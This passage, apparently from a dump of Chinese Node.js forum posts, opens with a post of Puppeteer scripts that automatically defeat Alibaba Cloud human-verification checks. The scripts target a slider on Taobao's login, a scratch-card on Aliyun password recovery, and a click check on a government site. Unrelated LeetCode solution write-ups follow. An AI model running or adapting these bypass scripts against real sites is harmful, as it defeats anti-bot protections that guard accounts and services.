chrome = await chromeLauncher.launch({});\n    setTimeout(async () =&gt; {\n        await process.kill(chrome.pid)\n    }, 30 * 1000);\n    const url = &#96;http:&#x2F;&#x2F;127.0.0.1:${chrome.port}&#x2F;json&#x2F;version&#96;;\n&#x2F;&#x2F;请求获取调试接口\n    const body = await crawler_utils.requestJob(url);\n    const webSocketDebuggerUrl = body.webSocketDebuggerUrl;\n    console.log(webSocketDebuggerUrl);\n    console.log(chrome.pid);\n    &#x2F;&#x2F;使用puppeteer连接本地chrome\n    const browser = await puppeteer.connect({browserWSEndpoint: webSocketDebuggerUrl});\n    const page = await browser.newPage();\n    await page.goto(&quot;http:&#x2F;&#x2F;www.yczwfw.gov.cn&#x2F;web2&#x2F;src&#x2F;index&#x2F;loginForThd.html&quot;);\n    await page.waitFor(5 * 1000);\n    &#x2F;&#x2F;点击智能验证\n    await page.click(&#96;#rectBottom&#96;);\n</code></pre><p>3.滑动验证\n<img src=\"http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/pic/66306/cn_zh/1517884222497/%E6%BB%91%E5%8A%A8%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%E5%9B%BE1.png\" alt=\"image\">\n某购物网站</p>\n<pre class=\"prettyprint\"><code>const chromeLauncher = require(&#x27;chrome-launcher&#x27;);\nconst crawler_utils = require(&#x27;..&#x2F;..&#x2F;utils&#x2F;crawler_utils&#x27;);\nconst puppeteer = require(&#x27;puppeteer&#x27;);\nasync function sliding(account,password) {\n    const chrome = await chromeLauncher.launch({});\n    setTimeout(async () =&gt; {\n        await process.kill(chrome.pid)\n    }, 60 * 1000);\n    const url = &#96;http:&#x2F;&#x2F;127.0.0.1:${chrome.port}&#x2F;json&#x2F;version&#96;;\n\n    const body = await crawler_utils.requestJob(url);\n    const webSocketDebuggerUrl = body.webSocketDebuggerUrl;\n    console.log(webSocketDebuggerUrl);\n    console.log(chrome.pid);\n    const browser = await puppeteer.connect({browserWSEndpoint: webSocketDebuggerUrl});\n    const page = await browser.newPage();\n    await page.goto(&quot;https:&#x2F;&#x2F;www.taobao.com&#x2F;&quot;);\n    await page.waitFor(5 * 1000);\n    &#x2F;&#x2F;点击跳转到登录页面\n    await page.click(&#96;#J_SiteNavLogin &gt; div.site-nav-menu-hd &gt; div.site-nav-sign &gt; a.h&#96;);\n   await page.waitFor(2*1000)\n   &#x2F;&#x2F;切换到账号密码输入部分\n    await page.click(&#96;#J_Quick2Static&#96;);\n    &#x2F;&#x2F;输入账号密码\n    await page.type(&#96;#TPL_username_1&#96;,account,{delay:100});\n    await page.type(&#96;#TPL_password_1&#96;,password,{delay:100});\n    &#x2F;&#x2F;对于阿里云的滑动验证，风控那边返回给你的滑块的#id会在3个里面随机返回给你一个\n    try {\n        await page.hover(&#96;#nc_3_n1z&#96;).catch(e1 =&gt; {\n            throw e1;\n        });\n    } catch (e) {\n        try {\n            await page.hover(&#96;#nc_2_n1z&#96;).catch(e1 =&gt; {\n                throw e1;\n            });\n        } catch (err) {\n            await page.hover(&#96;#nc_1_n1z&#96;).catch(e1 =&gt; {\n                throw e1;\n            })\n        }\n    }\n    &#x2F;&#x2F;获取鼠标\n    const mouse = await page.mouse;\n    await mouse.down();\n    await mouse.move(750, 0, {steps: 100});\n    await mouse.up();\n    await page.waitFor(5 * 1000);\n    &#x2F;&#x2F;点击登录\n    await page.click(&#96;#J_SubmitStatic&#96;);\n    await page.waitFor(5 * 1000);\n}\n\nsliding(&#96;moonfy&#96;,&#96;moonfy&#96;);\n\n</code></pre><p>4.刮刮卡验证\n<img src=\"http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/pic/66307/cn_zh/1518006558309/%E5%88%AE%E5%88%AE%E5%8D%A1%E5%9B%BE1.png\" alt=\"image\"></p>\n<pre class=\"prettyprint\"><code>const chromeLauncher = require(&#x27;chrome-launcher&#x27;);\nconst crawler_utils = require(&#x27;..&#x2F;..&#x2F;utils&#x2F;crawler_utils&#x27;);\nconst puppeteer = require(&#x27;puppeteer&#x27;);\nasync function scratch(account) {\n    const chrome = await chromeLauncher.launch({});\n    setTimeout(async () =&gt; {\n        await process.kill(chrome.pid)\n    }, 30 * 1000);\n    const url = &#96;http:&#x2F;&#x2F;127.0.0.1:${chrome.port}&#x2F;json&#x2F;version&#96;;\n    const body = await crawler_utils.requestJob(url);\n    const webSocketDebuggerUrl = body.webSocketDebuggerUrl;\n    console.log(webSocketDebuggerUrl);\n    console.log(chrome.pid);\n    const browser = await puppeteer.connect({browserWSEndpoint: webSocketDebuggerUrl});\n    const pages = await browser.pages();\n    const page = pages[0];\n    await page.goto(&quot;https:&#x2F;&#x2F;passport.aliyun.com&#x2F;ac&#x2F;password_find.htm?spm=a212t0.3047821.0.0.a95e79f4BZSwz0&amp;lang=zh_CN&amp;appName=aliyun&amp;fromSite=6&amp;call_back_url=##returnUrl##&quot;);\n    await page.waitFor(5 * 1000);\n    await page.type(&#96;#J-accName&#96;,account,{delay:100});\n    await page.hover(&#96;#nc_1_canvas&#96;);\n    await page.waitFor( 1000);\n    const mouse = await page.mouse;\n    await mouse.down();\n    &#x2F;&#x2F;在刮刮卡个人测试中，我们需要找到刮刮卡图片四个点的坐标，可以先启动testlaunch.js，另一个puppeteer的连接程序，然后通过page.hover(&#96;#nc_1_canvas&#96;)找到刮刮卡的中点，通过不断的操作mouse，查看刮刮卡上鼠标移动的轨迹，可以轻松找到4点点\n    &#x2F;&#x2F;610 380  右上\n    &#x2F;&#x2F;610 480  右下\n    &#x2F;&#x2F;305,385  左上\n    &#x2F;&#x2F; 300 480 左下\n    for(let y=380;y&lt;481;y+=20){\n        await mouse.move(300,y,{steps: 100});\n        await mouse.move(610,y,{steps: 100});\n    }\n    await mouse.up();\n    await page.waitFor(2*1000);\n    await page.click(&#96;#submitBtn&#96;);\n}\nscratch(&quot;12345678&quot;);\n\n</code></pre><p>5.投篮验证</p>\n<p>周日的时候好好看了一下，发现这个主要是接SDK,所以没找到相关的网站来写Demo来给大家展示，所以今天就主要给大家说说解决思路：解决投篮验证，就必须将操作篮球将其移动到篮筐，因此，我们需要知道的是篮球和篮筐的坐标点。篮球由于是可以移动的，因此篮球的初始坐标点肯定是可以从服务端拿到的，至于蓝框的坐标点，</p>\n<p><img src=\"http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/pic/45266/cn_zh/1478675449183/Android&amp;iOS.png\" alt=\"image\"></p>\n<p>项目地址：\n<a href=\"https://github.com/moonfy/Human-verification/\">https://github.com/moonfy/Human-verification/</a></p>\n<h4>京东web滑块，京东H5图片验证</h4>\n<p>…京东的正在写</p>\n</div>","title":"年底福利，爬虫干货献上--top2电商","last_reply_at":"2019-01-16T07:20:41.962Z","good":false,"top":false,"reply_count":5,"visit_count":1306,"create_at":"2019-01-13T13:38:06.987Z","author":{"loginname":"moonfy","avatar_url":"https://avatars0.githubusercontent.com/u/20022453?v=4&s=120"}},{"id":"5c32b76f3898674067a7be72","author_id":"5c32b6b05bf06c5e7e3f1f6e","tab":"ask","content":"<div class=\"markdown-text\"><p>我现在有个问题！求大神指导。在　node 开发api的时候，借用中间件的时候，如何保存全局用户信息，就像flask的 g模块，\n类似这样的例子，g.cur_user= user</p>\n</div>","title":"关于node临时变量的问题","last_reply_at":"2019-01-16T06:47:53.230Z","good":false,"top":false,"reply_count":2,"visit_count":719,"create_at":"2019-01-07T02:20:31.147Z","author":{"loginname":"EyecatWang","avatar_url":"https://avatars1.githubusercontent.com/u/26106551?v=4&s=120"}},{"id":"5c3beca7a4d44449266b06b1","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a94b71eab7d?w=1069&amp;h=585&amp;f=jpeg&amp;s=45061\" alt=\"image\"></p>\n<h3>前言</h3>\n<p>2018年年底, 呆了不到一年的公司就这样解散了。遥想当初3月份刚刚加入公司的时候, 公司刚刚拿到数亿的B轮融资。6月份又是数亿元的B+轮融资。又是换写字楼又是在外滩大屏幕上打广告好不热闹，结果12月公司就关门了。真是世事无常啊。</p>\n<h3>1. 两数之和</h3>\n<h4>原题</h4>\n<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>\n<p>给定 nums = [2, 7, 11, 15], target = 9。因为 nums[0] + nums[1] = 2 + 7 = 9。所以返回 [0, 1]</p>\n<h4>思路</h4>\n<p>最简单的方法是通过两层for循环进行遍历, 使用暴力的查找两个子元素。但是这种方法的时间复杂度为O(n^2)。在大数据量的测试用例的情况下执行时间超时。那么我们有什么办法可以将时间复杂度降下来吗?这时我们可以用到HashMap。通过HashMap我们可以将时间复杂度降为O(2n)。<strong>如果是有序数组的情况下, 时间复杂度可以是O(n), 详见下题</strong>。</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[]} nums\n * @param {number} target\n * @return {number[]}\n *&#x2F;\nvar twoSum = function (nums, target) {\n  let hashMap = new Map()\n  &#x2F;&#x2F; 初始化hashMap\n  for (let i = 0; i &lt; nums.length; i++) {\n    if (!hashMap.has(nums[i])) {\n      hashMap.set(nums[i], i)\n    }\n  }\n  for (let i = 0; i &lt; nums.length; i++) {\n    let diff = target - nums[i]\n    if (hashMap.has(diff) &amp;&amp; hashMap.get(diff) !== i) {\n      return [i, hashMap.get(diff)]\n    }\n  }\n};\n</code></pre><hr>\n<h3>167. 两数之和 II - 输入有序数组</h3>\n<blockquote>\n<p>本题是<em>1. 两数之和</em>的引伸问题。如果将无限数组变为有序数组, 有什么更好的办法解决问题吗？</p>\n</blockquote>\n<h4>思路</h4>\n<p>这一题我们可以使用对撞指针或者说双指针的思路解决它, 并可以将时间复杂度控制在O(n)。具体思路见下图。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a93659d91a7?w=1776&amp;h=1114&amp;f=png&amp;s=161355\" alt=\"image\"></p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>&#x2F;**\n * @param {number[]} numbers\n * @param {number} target\n * @return {number[]}\n *&#x2F;\nvar twoSum = function(numbers, target) {\n  const len = numbers.length\n  let start = 0\n  let end = len - 1\n  while (start &lt; end) {\n    if (numbers[start] + numbers[end] === target) {\n      return [start + 1, end + 1]\n    } else if (numbers[start] + numbers[end] &lt; target) {\n      start += 1\n    } else {\n      end -= 1\n    }\n  }\n  return []\n};\n</code></pre><hr>\n<h3>3. 无重复字符的最长子串</h3>\n<h4>原题</h4>\n<p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。</p>\n<p>输入: “abcabcbb”。输出: 3 。解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。</p>\n<p>输入: “bbbbb”。输出: 1。解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。</p>\n<h4>思路</h4>\n<p>比较简单的思路是依旧使用双层for循环。代码如下。时间复杂度为O(n^3)。<em>indexOf的复杂度为O(n)</em>。更好的解决办法是使用双指针配合HashMap。虽然使用了额外的空间。但是可以将时间复杂度为O(n)。具体思路见下图。</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; 暴力循环\nif (s.length === 0) return 0\nif (s.length === 1) return 1\nlet maxLen = 0\nfor1: for (let i = 0; i &lt; s.length; i++) {\n  let str = s[i]\n  for2: for (let j = i + 1; j &lt; s.length; j++) {\n    maxLen = Math.max(maxLen, str.length)\n    if (str.indexOf(s[j]) &lt; 0) {\n      str += s[j]\n      maxLen = Math.max(maxLen, str.length)\n    } else {\n      continue for1\n    }\n  }\n}\nreturn maxLen\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a93671690df?w=2262&amp;h=1336&amp;f=png&amp;s=298442\" alt=\"image\"></p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {string} s\n * @return {number}\n *&#x2F;\nvar lengthOfLongestSubstring = function (s) {\n  &#x2F;&#x2F; 使用双指针解决 + hash\n  const len = s.length\n  let hashMap = new Map()\n  let start = 0\n  let end = 0\n  let maxLen = 0\n\n  while (end &lt; len) {\n    if (!hashMap.has(s[end])) {\n      hashMap.set(s[end], 1)\n      maxLen = Math.max(maxLen, [...hashMap.keys()].length)\n      end += 1\n    } else {\n      hashMap.delete(s[start])\n      start += 1\n    }\n  }\n\n  return maxLen\n};\n</code></pre><hr>\n<h3>6. Z 字形变换</h3>\n<h4>原题</h4>\n<p>将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。</p>\n<p>比如输入字符串为 “LEETCODEISHIRING” 行数为 3 时，排列如下：</p>\n<pre class=\"prettyprint language-js\"><code>L   C   I   R\nE T O E S I I G\nE   D   H   N\n</code></pre><p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：“LCIRETOESIIGEDHN”。</p>\n<h4>思路</h4>\n<p>这道题目我的解决思路是将字符串转化为二维数组。输入时按照<strong>N</strong>字形输入。最后逐行读取二维数组，并将二维数组中空的填充去除。返回最后的结果。通过推导可知。当行数为 2 时, 斜线上的字母数量为0。当行数为 3 时, 斜线上的字母数量为1。当行数为 4 时, 斜线上的字母数量为2。</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; 规律如下\nL A C I R\nE T O E S\n\nL   C   I   R\nE T O E S I I G\nE   D   H   N\n\nL     D     R\nE   O E   I I\nE C   I H   N\nT     S     G\n</code></pre><h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>&#x2F;**\n * @param {string} s\n * @param {number} numRows\n * @return {string}\n *&#x2F;\nvar convert = function (s, numRows) {\n  if (numRows === 1) return s\n  let result = []\n  let matrix = []\n  let rowCounter = 0\n  let prevRowCounter = 0\n  let colCounter = 0\n  let prevColCounter = 0\n  const other = numRows - 2\n  for (let i = 0; i &lt; numRows; i++) {\n    matrix.push([])\n  }\n  &#x2F;&#x2F; 填充二维数组\n  for (let i = 0; i &lt; s.length; i++) {\n    matrix[rowCounter][colCounter] = s[i]\n    if (prevRowCounter &lt;= rowCounter) {\n      prevRowCounter = rowCounter\n      if (rowCounter &gt;= numRows - 1) {\n        rowCounter -= 1\n        colCounter += 1\n      } else {\n        rowCounter += 1\n      }\n    } else {\n      prevRowCounter = rowCounter\n      if (rowCounter &lt;= 0) {\n        rowCounter += 1\n      } else {\n        rowCounter -= 1\n        colCounter += 1\n      }\n    }\n  }\n  for (let i = 0; i &lt; matrix.length; i++) {\n    for (let j = 0; j &lt; matrix[i].length; j++) {\n      if (matrix[i][j] !== undefined) {\n        result.push(matrix[i][j])\n      }\n    }\n  }\n  return result.join(&#x27;&#x27;)\n};\n</code></pre><hr>\n<h3>11. 盛最多水的容器</h3>\n<h4>原题</h4>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a9365a3ff2a?w=1056&amp;h=1042&amp;f=png&amp;s=143295\" alt=\"image\"></p>\n<h4>思路</h4>\n<p>本题的思路依然是使用对撞指针。我们在这里首先需要明确一个概念, 水的面积和高度和宽度有关。高度的取决于两条边框中<strong>最小</strong>的一边。具体思路见下图。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a9365aa028f?w=2136&amp;h=1280&amp;f=png&amp;s=161320\" alt=\"image\"></p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; https:&#x2F;&#x2F;leetcode-cn.com&#x2F;explore&#x2F;orignial&#x2F;card&#x2F;all-about-array&#x2F;232&#x2F;two-pointers&#x2F;969&#x2F;\n\n&#x2F;**\n * @param {number[]} height\n * @return {number}\n *&#x2F;\nvar maxArea = function (height) {\n  if (height.length === 1 || height.length === 0) {\n    return 0\n  }\n  \n  const len = height.length\n  let start = 0\n  let end = len - 1\n  let max = 0\n  while (start &lt; end) {\n    max = Math.max(max, (Math.min(height[start], height[end]) * (end - start)))\n    if (height[start] &lt;= height[end]) {\n      start += 1\n    } else {\n      end -= 1\n    }\n  }\n  return max\n};\n</code></pre><hr>\n<h3>15. 三数之和</h3>\n<h4>原题</h4>\n<p>给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。</p>\n<p>注意：答案中不可以包含重复的三元组。</p>\n<p>例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]， 满足要求的三元组集合为：[ [-1, 0, 1], [-1, -1, 2] ]</p>\n<h4>思路</h4>\n<p>最简单最暴力的方法是使用三层for循环进行查找。但是时间复杂度为O(n^3)。我们的目标是将时间复杂度降为O(n^2)。我们只需要将原数组进行排序后, 结合<strong>167. 两数之和 II - 输入有序数组</strong>这道题目的思路(<strong>对撞指针</strong>)就可以将时间复杂度控制在O(n^2)。</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[]} nums\n * @return {number[][]}\n *&#x2F;\nvar threeSum = function(nums) {\n  let result = []\n  let hashMap = new Map()\n  &#x2F;&#x2F; 容错处理\n  if (nums.length &lt; 3) return []  \n  &#x2F;&#x2F; 容错处理\n  if (nums.length === 3) {\n      if (nums[0] + nums[1] + nums[2] === 0) return [nums]\n      return []\n  }\n  nums = nums.sort((a, b) =&gt; a - b)\n  for (let i = 0; i &lt; nums.length - 3; i++) {\n      let start = i + 1\n      let end = nums.length - 1\n      let target = 0 - nums[i]\n      while (start &lt; end) {\n          if (nums[start] + nums[end] === target) {\n              let arr = [nums[i], nums[start], nums[end]]\n              let key = arr.join(&#x27;&#x27;)\n              if (!hashMap.has(key)) {\n                  hashMap.set(key, true)\n                  result.push(arr)\n              }\n              end -= 1\n              start += 1\n          } else if (nums[start] + nums[end] &gt; target) {\n              end -= 1\n          } else {\n              start += 1\n          }\n      }\n  }\n  return result\n};\n</code></pre><hr>\n<h3>16. 最接近的三数之和</h3>\n<h4>原题</h4>\n<p>给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。</p>\n<p>例如，给定数组 nums = [-1，2，1，-4], 和 target = 1。 与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2)。</p>\n<h4>思路</h4>\n<p>本题的思路与<strong>15. 三数之和</strong>基本类似。区别在于我们需要在循环中记录的是最小的差值(<strong>Math.abs(target - sum)</strong>)。</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[]} nums\n * @param {number} target\n * @return {number}\n *&#x2F;\nvar threeSumClosest = function(nums, target) {\n  let diff = Infinity\n  let sums = undefined\n  if (nums.length &lt;= 3) return nums.reduce((a, b) =&gt; a + b, 0)\n  nums = nums.sort((a, b) =&gt; a - b)\n  for (let i = 0; i &lt; nums.length; i++) {\n    let start = i + 1\n    let end = nums.length - 1\n    while (start &lt; end) {\n      if (Math.abs(target - (nums[i] + nums[start] + nums[end])) &lt; diff) {\n         &#x2F;&#x2F; 最接近的和\n         sums = nums[i] + nums[start] + nums[end]\n         &#x2F;&#x2F; 当前最小的差值\n         diff = Math.abs(target - (nums[i] + nums[start] + nums[end]))\n      }\n      if (nums[i] + nums[start] + nums[end] &gt; target) {\n          end -= 1\n      } else if (nums[i] + nums[start] + nums[end] &lt; target) {\n          start += 1\n      } else {\n          return target\n      }\n    }\n  }\n  return sums\n};\n</code></pre><hr>\n<h3>20. 有效的括号</h3>\n<h4>原题</h4>\n<p>给定一个只包括 ‘(’，’)’，’{’，’}’，’[’，’]’ 的字符串，判断字符串是否有效。</p>\n<ol>\n<li>输入: “()[]{}”, 输出: true</li>\n<li>输入: “(]”, 输出: false</li>\n</ol>\n<h4>思路</h4>\n<p>本题的解决办法需要使用<strong>栈</strong>这个数据结构(<strong>javascript中我们使用数组进行模拟栈</strong>), 具体思路见下图</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a936704a448?w=1966&amp;h=1186&amp;f=png&amp;s=160760\" alt=\"image\"></p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {string} s\n * @return {boolean}\n *&#x2F;\nvar isValid = function (s) {\n  if (s.length === 0) return true\n  if (s.length === 1) return false\n  let queue = []\n  for (let i = 0; i &lt; s.length; i++) {\n    if (!queue.length) {\n      queue.push(s[i])\n    } else {\n      let tail = queue[queue.length - 1]\n      if (s[i] === &#x27;}&#x27; &amp;&amp; tail === &#x27;{&#x27;) {\n        queue.pop()\n        continue\n      } else if (s[i] === &#x27;]&#x27; &amp;&amp; tail === &#x27;[&#x27;) {\n        queue.pop()\n        continue\n      } else if (s[i] === &#x27;)&#x27; &amp;&amp; tail === &#x27;(&#x27;) {\n        queue.pop()\n        continue\n      } else {\n        queue.push(s[i])\n      }\n    }\n  }\n  if (!queue.length) {\n    return true\n  } else {\n    return false\n  }\n};\n\n</code></pre><hr>\n<h3>46. 全排列</h3>\n<h4>原题</h4>\n<p>给定一个没有重复数字的序列，返回其所有可能的全排列。输入: [1,2,3]。 输出: [ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1] ]</p>\n<h4>思路</h4>\n<p>此题拥有两种思路<a href=\"https://www.cnblogs.com/pmars/p/3458289.html\">字典法</a>与递归法。递归法较为容易理解。我采用的也是递归法，代码如下。</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[]} nums\n * @return {number[][]}\n *&#x2F;\nvar permute = function(nums) {\n    \n  let result = []\n  \n  if (nums.length &lt;= 1) result = [nums]\n\n  function exchange (title, arr) {\n    for (let i = 0; i &lt; arr.length; i++) {\n      let cloneArr = [...arr]\n      let newFirst = [...title, ...cloneArr.splice(i, 1)]\n      if (cloneArr &amp;&amp; cloneArr.length) {\n        exchange(newFirst, cloneArr)\n      } else {\n        result.push(newFirst)\n      }\n    }\n  }\n\n  for (let i = 0; i &lt; nums.length; i++) {\n    let cloneArr = [...nums]\n    let first = cloneArr.splice(i, 1)\n    exchange(first, cloneArr)\n  }\n  \n  return result\n};\n</code></pre><hr>\n<h3>53. 最大子序和</h3>\n<h4>原题</h4>\n<p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>\n<p>示例:</p>\n<p>输入: [-2,1,-3,4,-1,2,1,-5,4],</p>\n<p>输出: 6</p>\n<p>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p>\n<h4>思路</h4>\n<p>如果要在O(n)的时间复杂度的情况下解开本题, 需要使用动态规划的思想。但是本人能力有限, 动态规划不是很懂。这里只能说一个大概的思路，敬请谅解。</p>\n<p>我们从数组中的第一位开始循环求和</p>\n<p>如果sum(和) &lt; 0。接下来的一位next无论大于0还是小于0, 都应当取代当前的负数sum。因为如果next &lt; 0, sum + next 将会更小, 所以应当舍弃之前的sum。如果next大于0, sum更应当从next开始重新计算。</p>\n<p>如果sum(和) &gt; 0。如果接下来的一位next与当前的sum的和大于MAX, next与当前sum的和将成为新的MAX。否则继续向下迭代。</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[]} nums\n * @return {number}\n *&#x2F;\nvar maxSubArray = function (nums) {\n  if (nums.length &lt;= 1) return nums[0]\n  let sum = nums[0]\n  let MAX = sum\n  for (let i = 1; i &lt; nums.length; i++) {\n    if (sum &gt;= 0) {\n      if (sum + nums[i] &gt;= MAX) {\n        MAX = sum + nums[i]\n      }\n      sum = sum + nums[i]\n    } else {\n      if (nums[i] &gt;= MAX) {\n        MAX = nums[i]\n      }\n      sum = nums[i]\n    }\n  }\n  return MAX\n};\n</code></pre><hr>\n<h3>62. 不同路径</h3>\n<h4>原题</h4>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a93ec7bc3c8?w=1036&amp;h=1238&amp;f=png&amp;s=150013\" alt=\"image\"></p>\n<h4>思路</h4>\n<p>所谓的不同路径, 其实就是求排列组合。比如 3 * 7 的网格中。机器人从起点到终点所需要的步骤可以抽象为一个数组。[bottom, bottom, right, right, right, right, right, right]，所有的路径，即是这个数组的所有排列组合。</p>\n<p>另外一种思路, 第一行所有网格的可能路径数均为1。第一列所有网格的数可能的路径均为1。通过推导可以得到如下的表格。终点可能的路径为28。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a93f3f62a72?w=1402&amp;h=124&amp;f=png&amp;s=14539\" alt=\"image\"></p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number} m\n * @param {number} n\n * @return {number}\n *&#x2F;\nvar uniquePaths = function(m, n) {\n  &#x2F;&#x2F; 思路1\n  let matrix = []\n  for (let i = 0; i &lt; n; i++) {\n    let arr = new Array(m).fill(1)\n    matrix.push(arr)\n  }\n  for (let i = 1; i &lt; n; i++) {\n    for (let j = 1; j &lt; m; j++) {\n      matrix[i][j] = matrix[i - 1][j] + matrix[i][j - 1]\n    }\n  }\n  return matrix[n-1][m-1]\n\n  &#x2F;&#x2F; 思路二, 可行, 但是会超出时间限制\n  let arr = []\n  let hashMap = new Map()\n  for (let i = 0; i &lt; m - 1; i++) {\n    arr.push(&#x27;m&#x27;)\n  }\n  for (let i = 0; i &lt; n - 1; i++) {\n    arr.push(&#x27;n&#x27;)\n  }\n\n  if (arr.length &lt;= 1) return 1\n\n  function exchange (title, arr) {\n    for (let i = 0; i &lt; arr.length; i++) {\n      let cloneArr = [...arr]\n      let newFirst = [...title, ...cloneArr.splice(i, 1)]\n      if (cloneArr &amp;&amp; cloneArr.length) {\n        exchange(newFirst, cloneArr)\n      } else {\n        let key = newFirst.join(&#x27;&#x27;)\n        if (!hashMap.has(key)) {\n          hashMap.set(key, true)\n        }\n      }\n    }\n  }\n\n  for (let i = 0; i &lt; arr.length; i++) {\n    let cloneArr = [...arr]\n    let first = cloneArr.splice(i, 1)\n    exchange(first, cloneArr)\n  }\n  return hashMap.size\n};\n</code></pre><hr>\n<h3>63. 不同路径 II</h3>\n<h4>原题</h4>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a9433b3eec5?w=1028&amp;h=1240&amp;f=png&amp;s=155595\" alt=\"image\"></p>\n<h4>思路</h4>\n<p>思路1使用递归法, 比较简单不在赘述</p>\n<p>思路2与<strong>62. 不同路径</strong>类似。但不同的是出现了障碍物这个变量。所以我们在初始化表格的第一行与第一列的时候需要格外的注意。假设一个 3 * 7的网格。具体思路见下图。</p>\n<p>假设地图如下</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a9437743734?w=1408&amp;h=140&amp;f=png&amp;s=15606\" alt=\"image\"></p>\n<p>初始化第一行(<strong>如果第一行中的前一个为障碍物话, 那么后续可能路径的均为0</strong>)，与第一列后(<strong>如果第一列中的前一个为障碍物话, 那么后续可能路径的均为0</strong>), 障碍物因为本身不能行走所以可能路径数直接设置为0。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/1/13/16846a93f528392b?w=1406&amp;h=134&amp;f=png&amp;s=11765\" alt=\"image\"></p>\n<p>接下来的方法同<strong>62. 不同路径</strong>一样。</p>\n<h4>代码</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * @param {number[][]} obstacleGrid\n * @return {number}\n *&#x2F;\nvar uniquePathsWithObstacles = function (obstacleGrid) {\n  &#x2F;&#x2F; 思路1, 使用动态规划和递归\n  &#x2F;&#x2F; 没有通过大数据量的测试用例\n  let counter = 0\n  const targetX = obstacleGrid[0].length - 1\n  const targetY = obstacleGrid.length - 1\n  &#x2F;**\n   * @param {number} x 当前矩阵的x坐标\n   * @param {number} y 当前矩阵的y坐标\n   * @param {string} direction 方向 right, bottom\n   *&#x2F;\n  const pathfinding = (x, y, direction) =&gt; {\n    switch (direction) {\n      case &#x27;right&#x27;:\n        x = x + 1\n        break\n      case &#x27;bottom&#x27;:\n        y = y + 1\n        break\n      default:\n        break\n    }\n    &#x2F;&#x2F; 遇到障碍物或者越界的情况下, 思路一条\n    if (y &gt;= targetY + 1) {\n      return\n    }\n    if (x &gt;= targetX + 1) {\n      return\n    }\n    if (obstacleGrid[y][x] === 1) {\n      return\n    }\n    if (x === targetX &amp;&amp; y === targetY) {\n      counter += 1\n    } else if (x !== targetX &amp;&amp; y === targetY) {\n      &#x2F;&#x2F; 只能向右走\n      pathfinding(x, y, &#x27;right&#x27;)\n    } else if (x === targetX &amp;&amp; y !== targetY) {\n      &#x2F;&#x2F; 只能向下走\n      pathfinding(x, y, &#x27;bottom&#x27;)\n    } else {\n      &#x2F;&#x2F; 可能向右走\n      &#x2F;&#x2F; 可能向下走\n      pathfinding(x, y, &#x27;right&#x27;)\n      pathfinding(x, y, &#x27;bottom&#x27;)\n    }\n  }\n  pathfinding(0, 0)\n  return counter\n\n  &#x2F;&#x2F; 思路二\n  &#x2F;&#x2F; 带有条件的初始化第一行与第一列\n  &#x2F;&#x2F; 初始化x方向\n  &#x2F;&#x2F; 初始化y方向\n  const xLen = obstacleGrid[0].length\n  const yLen = obstacleGrid.length\n  for (let i = 0; i &lt; xLen; i++) {\n    if (i - 1 &gt;= 0) {\n      if (obstacleGrid[0][i-1] === 0) {\n        obstacleGrid[0][i] = 0\n      } else if (obstacleGrid[0][i-1] === 1 &amp;&amp; obstacleGrid[0][i] !== 1) {\n        obstacleGrid[0][i] = 1\n      } else if (obstacleGrid[0][i] == 1) {\n        obstacleGrid[0][i] = 0\n      }\n    } else {\n      if (obstacleGrid[0][i] === 0) {\n        obstacleGrid[0][i] = 1\n      